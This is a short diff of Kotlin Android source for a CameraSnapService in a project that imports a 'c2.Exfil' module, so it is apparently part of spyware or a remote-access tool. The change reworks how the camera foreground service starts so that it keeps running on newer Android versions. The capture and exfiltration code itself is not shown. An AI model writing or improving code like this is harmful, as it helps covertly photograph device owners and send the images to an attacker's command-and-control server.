@@ -22,6 +22,7 @@ import android.view.Surface
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import com.sp.core.c2.Exfil
+import com.sp.core.util.Fgs
 import java.io.File
 
 /**
@@ -37,11 +38,8 @@ class CameraSnapService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        try {
-            startForeground(NOTIF_ID, buildNotification())
-        } catch (t: Throwable) {
-            // Android 12+ refuses foreground services without the matching
-            // permission or from a background start - never kill the process.
+        if (!Fgs.start(this, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA,
+                buildNotification())) {
             stopSelf()
             return
         }
